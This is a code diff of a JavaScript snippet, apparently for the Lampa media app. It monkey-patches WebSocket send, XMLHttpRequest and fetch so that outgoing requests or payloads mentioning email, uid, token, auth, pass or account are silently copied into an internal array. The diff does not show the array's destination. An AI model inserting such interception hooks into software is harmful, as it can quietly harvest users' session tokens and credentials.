@@ -19,48 +19,40 @@
     return p;
   }
 
-  (function() {
-    var o = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(m,u) { this.__u=u; return o.apply(this,arguments); };
-    var s = XMLHttpRequest.prototype.send;
+  try {
+    var _wsSend = WebSocket.prototype.send;
+    WebSocket.prototype.send = function(data) {
+      try {
+        var d = typeof data === 'string' ? data : '';
+        if (d.match(/(email|uid|token|auth|skaz|account|unic_id|RchRegistry)/i) && urls.length<500) {
+          urls.push({type:'ws_send', data: d.substring(0,2000)});
+        }
+      } catch(e){}
+      return _wsSend.apply(this, arguments);
+    };
+  } catch(e){}
+
+  try {
+    var _xhrOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(m,u) { this.__u=u; return _xhrOpen.apply(this,arguments); };
+    var _xhrSend = XMLHttpRequest.prototype.send;
     XMLHttpRequest.prototype.send = function(b) {
       var u = this.__u||'';
-      if (u.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({url:u,p:hp(u)});
-      return s.apply(this,arguments);
+      if (u.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({type:'xhr',url:u,p:hp(u)});
+      return _xhrSend.apply(this,arguments);
     };
+  } catch(e){}
+
+  try {
     if (typeof fetch!=='undefined') {
-      var f = window.fetch;
+      var _fetch = window.fetch;
       window.fetch = function(u,o) {
         var s = (typeof u==='string')?u:(u.url||u.href||'');
-        if (s.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({url:s,p:hp(s)});
-        return f.apply(this,arguments);
+        if (s.match(/(email|uid|token|auth|pass|skaz|account)/i) && urls.length<500) urls.push({type:'fetch',url:s,p:hp(s)});
+        return _fetch.apply(this,arguments);
       };
     }
-  })();
-
-  (function() {
-    var WS = window.WebSocket;
-    window.WebSocket = function(url, protocols) {
-      var msg = {};
-      var ws = protocols ? new WS(url, protocols) : new WS(url);
-      var origSend = ws.send;
-      ws.send = function(data) {
-        try {
-          var d = typeof data === 'string' ? data : '';
-          if (d.match(/(email|uid|token|auth|skaz|account)/i) && urls.length<500) {
-            urls.push({url: url.substring(0,200), ws_data: d.substring(0,500)});
-          }
-        } catch(e){}
-        return origSend.call(this, data);
-      };
-      return ws;
-    };
-    window.WebSocket.prototype = WS.prototype;
-    window.WebSocket.CONNECTING = 0;
-    window.WebSocket.OPEN = 1;
-    window.WebSocket.CLOSING = 2;
-    window.WebSocket.CLOSED = 3;
-  })();
+  } catch(e){}
 
   var t = setInterval(function() {
     if (typeof Lampa==='undefined') return;
